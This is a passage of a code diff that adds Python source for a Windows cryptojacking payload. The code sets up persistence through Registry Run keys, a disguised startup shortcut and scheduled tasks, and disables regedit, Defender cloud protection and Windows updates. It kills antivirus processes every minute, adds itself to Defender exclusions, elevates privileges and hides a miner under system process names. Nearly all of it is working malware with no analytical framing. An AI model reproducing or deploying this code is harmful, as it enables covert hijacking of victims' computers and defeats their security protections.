+        hawk.info("[PERSISTENCE] Registry Run key added")
+    except Exception as e:
+        hawk.error(f"[PERSISTENCE] Registry Run key failed: {e}")
+
+    try:
+        startup_dir = os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'), r"Microsoft\Windows\Start Menu\Programs\Startup")
+        shortcut_path = os.path.join(startup_dir, "WindowsHelper.lnk")
+        ps_cmd = f'''
+$WshShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut('{shortcut_path}')
+$Shortcut.TargetPath = '{python_exe}'
+$Shortcut.Arguments = '"{script_path}"'
+$Shortcut.WindowStyle = 7
+$Shortcut.Save()
+'''
+        b64 = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
+        subprocess.run(['powershell', '-EncodedCommand', b64], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        hawk.info("[PERSISTENCE] Startup shortcut created")
+    except Exception as e:
+        hawk.error(f"[PERSISTENCE] Startup shortcut failed: {e}")
+
+def disable_regedit():
+    hawk.info("[REGEDIT_DISABLE] start")
+    try:
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
+        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+        hawk.info("[REGEDIT_DISABLE] done")
+    except Exception as e:
+        hawk.error(f"[REGEDIT_DISABLE] failed: {e}")
+
+def create_av_killer_task():
+    hawk.info("[AV_KILLER] creating scheduled task to kill AV installers every minute")
+    try:
+        task_name = "WindowsAvKiller"
+        ps_script = '''
+$procs = @('setup.exe','install.exe','avastui.exe','avgui.exe','bdagent.exe','kav.exe','mcshield.exe','navw32.exe','egui.exe','fsbts.exe','sophos.exe','mbam.exe','mbamservice.exe','regedit.exe')
+foreach ($p in $procs) { taskkill /f /im $p 2>$null }
+'''
+        b64 = base64.b64encode(ps_script.encode('utf-16le')).decode()
+        subprocess.run([
+            'schtasks', '/create', '/tn', task_name,
+            '/tr', f'powershell -EncodedCommand {b64}',
+            '/sc', 'minute', '/mo', '1', '/rl', 'HIGHEST', '/f'
+        ], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        hawk.info("[AV_KILLER] task created")
+    except Exception as e:
+        hawk.error(f"[AV_KILLER] failed: {e}", exc_info=True)
+
+def run_payload():
+    # Check if miner was paused by previous snooping detection
+    flag_path = os.path.join(tempfile.gettempdir(), 'miner_paused.flag')
+    if os.path.exists(flag_path):
+        try:
+            uptime = time.time() - psutil.boot_time()
+            if uptime > 300:  # 5 minutes
+                hawk.info("[MAIN] Stale pause flag found (uptime > 5 min), clearing and continuing.")
+                os.remove(flag_path)
+            else:
+                hawk.info("[MAIN] Miner was paused due to user activity. Exiting.")
+                sys.exit(0)
+        except:
+            # If we can't determine uptime, exit conservatively
+            hawk.info("[MAIN] Miner was paused due to user activity. Exiting.")
+            sys.exit(0)
+
+    # Check if the miner has already been deployed via lock file
+    exe_path, config_dir = check_previous_deployment()
+    if exe_path:
+        print("Script has already been deployed before")
+        hawk.info("[MAIN] Previous deployment detected, using existing miner")
+        disable_defender_cloud()
+        disable_windows_updates()
+
+        # Check if the exe is still the original name (who my pie.exe)
+        if os.path.basename(exe_path).lower() == f"{EXE_NAME.lower()}.exe":
+            hawk.info("[MAIN] Original miner name detected, renaming and generating config...")
+
+            # Rename exe to a legitimate system name (same as fresh deployment)
+            exe_names = [name for name in LEGIT_NAMES if name.lower().endswith('.exe')]
+            if not exe_names:
+                exe_names = ["RuntimeBroker.exe"]
+            running_procs = set()
+            try:
+                tasklist_out = subprocess.run(
+                    'tasklist /fo csv /nh', capture_output=True, text=True,
+                    shell=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW
+                ).stdout.lower()
+                for line in tasklist_out.splitlines():
+                    parts = line.split('","')
+                    if parts:
+                        img = parts[0].strip('"').lower()
+                        if img:
+                            running_procs.add(img)
+            except:
+                pass
+            available_names = [n for n in exe_names if n.lower() not in running_procs]
+            if not available_names:
+                available_names = exe_names
+            new_name = random.choice(available_names)
+            new_exe_path = os.path.join(os.path.dirname(exe_path), new_name)
+            os.rename(exe_path, new_exe_path)
+            add_folder_to_defender_exclusions(new_exe_path)
+            hawk.debug(f"[RENAME] renamed to {new_name} at {new_exe_path}")
+
+            # Make sure config_dir exists and generate config
+            if not os.path.isdir(config_dir):
+                config_dir = os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'),
+                                          "Microsoft", "Windows", "Themes", "CachedFiles")
+                os.makedirs(config_dir, exist_ok=True)
+            generate_config(config_dir)
+
+            # Update all lock files that point to the original miner (by basename match)
+            for lp in LOCK_PATHS:
+                if os.path.isfile(lp):
+                    try:
+                        with open(lp, 'r') as f:
+                            lines = f.read().strip().splitlines()
+                        if len(lines) >= 1 and os.path.basename(lines[0].strip()).lower() == f"{EXE_NAME.lower()}.exe":
+                            # This lock file pointed to the original miner; update it
+                            with open(lp, 'w') as lf:
+                                lf.write(f"{new_exe_path}\n{config_dir}")
+                    except:
+                        pass
+
+            exe_path = new_exe_path   # use the renamed path from now on
+        else:
+            # Already renamed – just ensure config is present
+            if not os.path.isfile(os.path.join(config_dir, 'config.json')):
+                generate_config(config_dir)
+
+        # Start the watchdog with the (possibly renamed) exe
+        watchdog = MinerWatchdog(exe_path, config_dir)
+        watchdog.start()
+        hawk.info("[WATCHDOG] started")
+        create_scheduled_task()
+        add_persistence_multi()
+        disable_regedit()
+        create_av_killer_task()
+        try:
+            while watchdog.running:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            hawk.info("[MAIN] KeyboardInterrupt received, shutting down")
+        finally:
+            if watchdog.miner_proc and watchdog.miner_proc.poll() is None:
+                watchdog.miner_proc.terminate()
+            hawk.info("[MAIN] exiting")
+        sys.exit(0)
+
+    # Ensure Defender cloud and Windows updates are off
+    disable_defender_cloud()
+    disable_windows_updates()
+
+    miner_exe = find_miner_exe()
+    if not miner_exe:
+        hawk.critical("[PAYLOAD] miner executable not found on disk, aborting")
+        trigger_exit(ERR['UNEXPECTED'], "Miner exe not found")
+    if not is_pe_file(miner_exe):
+        hawk.critical("[PAYLOAD] file is not a valid PE, aborting")
+        trigger_exit(ERR['UNEXPECTED'], "Invalid PE file")
+
+    # Rename exe to a legitimate system name
+    hawk.info("[RENAME] selecting new name for miner")
+    exe_names = [name for name in LEGIT_NAMES if name.lower().endswith('.exe')]
+    if not exe_names:
+        exe_names = ["RuntimeBroker.exe"]
+    running_procs = set()
+    try:
+        tasklist_out = subprocess.run(
+            'tasklist /fo csv /nh', capture_output=True, text=True,
+            shell=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW
+        ).stdout.lower()
+        for line in tasklist_out.splitlines():
+            parts = line.split('","')
+            if parts:
+                img = parts[0].strip('"').lower()
+                if img:
+                    running_procs.add(img)
+    except:
+        pass
+    available_names = [n for n in exe_names if n.lower() not in running_procs]
+    if not available_names:
+        available_names = exe_names
+    new_name = random.choice(available_names)
+    new_exe_path = os.path.join(os.path.dirname(miner_exe), new_name)
+    os.rename(miner_exe, new_exe_path)
+    add_folder_to_defender_exclusions(new_exe_path)
+    hawk.debug(f"[RENAME] renamed to {new_name} at {new_exe_path}")
+
+    # Config directory (hidden)
+    config_dir = os.path.join(os.environ.get('APPDATA', 'C:\\Users\\Default\\AppData\\Roaming'),
+                              "Microsoft", "Windows", "Themes", "CachedFiles")
+    os.makedirs(config_dir, exist_ok=True)
+    FILE_ATTRIBUTE_HIDDEN = 0x02
+    ctypes.windll.kernel32.SetFileAttributesW(config_dir, FILE_ATTRIBUTE_HIDDEN)
+    add_folder_to_defender_exclusions(config_dir)
+
+    generate_config(config_dir)
+
+    # Start the watchdog (it launches the miner internally)
+    watchdog = MinerWatchdog(new_exe_path, config_dir)
+    watchdog.start()
+    hawk.info("[WATCHDOG] started")
+
+    # Set up persistence to run this script again on logon
+    create_scheduled_task()
+    add_persistence_multi()
+    disable_regedit()
+    create_av_killer_task()
+
+    # Write a lock file
+    lock_file = random.choice(LOCK_PATHS)
+    os.makedirs(os.path.dirname(lock_file), exist_ok=True)
+    with open(lock_file, 'w') as lf:
+        lf.write(f"{new_exe_path}\n{config_dir}")
+
+    hawk.info("[PAYLOAD] watchdog running, persistence established")
+    # Keep the main thread alive as long as the watchdog wants to run
+    try:
+        while watchdog.running:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        hawk.info("[MAIN] KeyboardInterrupt received, shutting down")
+    finally:
+        if watchdog.miner_proc and watchdog.miner_proc.poll() is None:
+            watchdog.miner_proc.terminate()
+        hawk.info("[MAIN] exiting")
+        sys.exit(0)
+
+def main():
+    hawk.info(f"[MAIN] start, PID={os.getpid()}")
+    if not is_admin():
+        hawk.info("[MAIN] elevating")
+        elevate()
+    if not is_admin():
+        hawk.critical("[MAIN] still not admin after elevation attempt")
+        trigger_exit(ERR['ELEVATION_LOOP'], "Failed to obtain admin rights")
+    add_self_to_defender_exclusions()
+    # No environment checks here – stager already validated the target
+    run_payload()
+
+if __name__ == '__main__':
+    try:
+        main()
+    except Exception:
+        hawk.critical("!!! UNHANDLED ERROR OUTSIDE MAIN !!!", exc_info=True)
+        for h in hawk.handlers:
+            h.flush()
+    if sys.stdin and sys.stdin.isatty():
+        input("\n=== Script finished. Press Enter to exit...")
